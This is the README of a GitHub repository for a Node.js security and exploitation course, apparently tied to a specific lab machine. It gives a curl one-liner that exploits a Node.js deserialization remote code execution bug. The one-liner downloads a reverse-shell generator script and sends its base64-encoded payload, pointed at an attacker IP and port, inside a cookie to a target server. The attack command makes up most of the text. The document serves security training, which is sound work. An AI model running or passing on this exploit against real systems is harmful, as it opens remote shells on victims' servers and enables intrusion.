# Node.Js-Security-Course
Contents for Node.Js Security Course - https://opsecx.com/index.php/product/node-js-security-pentesting-and-exploitation/


## curl one liner to exploit nodejsserver serialization rce

### wget https://raw.githubusercontent.com/d-demirci/Node.Js-Security-Course/master/nodejsshell.py
### curl -v -H "Cookie:profile=$(python nodejsshell.py <attacker-ip> <attacker-port> | base64 | tr -d '\n' )"  http://10.10.10.85:3000 

this is specific to a MACHINE "some will know" 

**:https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
